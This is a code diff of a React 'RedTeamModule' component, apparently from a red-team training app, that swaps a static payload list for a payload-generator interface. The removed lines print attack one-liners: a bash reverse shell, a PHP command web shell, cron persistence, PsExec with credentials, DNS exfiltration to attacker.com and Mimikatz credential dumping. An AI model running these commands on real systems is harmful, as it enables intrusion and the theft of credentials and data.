@@ -97,7 +97,7 @@ const RedTeamModule = () => {
         <Card className="p-6 bg-card/50 backdrop-blur-sm">
           <div className="flex items-center gap-2 mb-4">
             <Target className="h-5 w-5 text-cyber-purple" />
-            <h2 className="text-xl font-semibold font-mono">{selectedPayload ? "Payload Examples" : "TTP Database"}</h2>
+            <h2 className="text-xl font-semibold font-mono">{selectedPayload ? "Payload Generator" : "TTP Database"}</h2>
           </div>
           {!selectedPayload ? (
             <>
@@ -116,19 +116,83 @@ const RedTeamModule = () => {
             </>
           ) : (
             <div className="space-y-4">
-              <Button variant="ghost" size="sm" onClick={() => setSelectedPayload(null)}>← Back</Button>
-              <Card className="p-4 bg-background/50">
-                <code className="text-xs font-mono text-cyber-green whitespace-pre-wrap block">
-                  {selectedPayload === "shells" && `# Reverse Shells\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\npython -c 'import socket...'`}
-                  {selectedPayload === "webshells" && `<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>`}
-                  {selectedPayload === "privesc" && `# Linux PrivEsc\nsudo -l\nfind / -perm -u=s -type f 2>/dev/null`}
-                  {selectedPayload === "persistence" && `# Cron Job\necho "* * * * * /tmp/shell.sh" | crontab -`}
-                  {selectedPayload === "lateral" && `# PsExec\npsexec.py domain/user:pass@192.168.1.10 cmd`}
-                  {selectedPayload === "exfil" && `# DNS Exfil\nfor i in $(cat data.txt); do dig $i.attacker.com; done`}
-                  {selectedPayload === "creds" && `# Mimikatz\nmimikatz.exe "sekurlsa::logonpasswords"`}
-                  {selectedPayload === "obfuscation" && `# Base64\necho 'cmd' | base64`}
-                </code>
-              </Card>
+              <Button variant="ghost" size="sm" onClick={() => { setSelectedPayload(null); setGeneratedPayload(null); }}>← Back</Button>
+              
+              {selectedPayload === "shells" && (
+                <div className="space-y-3">
+                  <div className="grid grid-cols-2 gap-3">
+                    <div>
+                      <label className="text-sm font-medium">Target IP/Host</label>
+                      <Input value={target} onChange={(e) => setTarget(e.target.value)} placeholder="10.0.0.1" className="font-mono" />
+                    </div>
+                    <div>
+                      <label className="text-sm font-medium">Port</label>
+                      <Input value={port} onChange={(e) => setPort(e.target.value)} placeholder="4444" className="font-mono" />
+                    </div>
+                  </div>
+                  <Button onClick={() => generatePayload("reverse-shell")} disabled={generating} className="w-full">
+                    {generating ? "Generating..." : "Generate Reverse Shell"}
+                  </Button>
+                </div>
+              )}
+              
+              {selectedPayload === "webshells" && (
+                <Button onClick={() => generatePayload("webshell")} disabled={generating} className="w-full">
+                  {generating ? "Generating..." : "Generate Web Shell"}
+                </Button>
+              )}
+              
+              {selectedPayload === "privesc" && (
+                <Button onClick={() => generatePayload("privesc")} disabled={generating} className="w-full">
+                  {generating ? "Generating..." : "Generate PrivEsc Payload"}
+                </Button>
+              )}
+              
+              {selectedPayload === "creds" && (
+                <Button onClick={() => generatePayload("creds")} disabled={generating} className="w-full">
+                  {generating ? "Generating..." : "Generate Credential Dump"}
+                </Button>
+              )}
+              
+              {selectedPayload === "lateral" && (
+                <Button onClick={() => generatePayload("lateral")} disabled={generating} className="w-full">
+                  {generating ? "Generating..." : "Generate Lateral Movement"}
+                </Button>
+              )}
+              
+              {selectedPayload === "obfuscation" && (
+                <Button onClick={() => generatePayload("obfuscation")} disabled={generating} className="w-full">
+                  {generating ? "Generating..." : "Generate Obfuscated Payload"}
+                </Button>
+              )}
+
+              {generatedPayload && (
+                <Card className="p-4 bg-background/50">
+                  <div className="flex items-center justify-between mb-3">
+                    <Badge variant="outline">{generatedPayload.type}</Badge>
+                    <Button size="sm" variant="ghost">
+                      <Download className="h-4 w-4 mr-2" />
+                      Download
+                    </Button>
+                  </div>
+                  {generatedPayload.instructions && (
+                    <div className="mb-3 text-xs text-muted-foreground">
+                      {generatedPayload.instructions}
+                    </div>
+                  )}
+                  <Textarea 
+                    value={generatedPayload.payload || ""} 
+                    readOnly 
+                    className="font-mono text-xs bg-black/50 min-h-[300px]"
+                  />
+                  {generatedPayload.usage && (
+                    <div className="mt-3 p-3 bg-muted/50 rounded text-xs">
+                      <div className="font-semibold mb-1">Usage:</div>
+                      <pre className="text-muted-foreground whitespace-pre-wrap">{generatedPayload.usage}</pre>
+                    </div>
+                  )}
+                </Card>
+              )}
             </div>
           )}
         </Card>
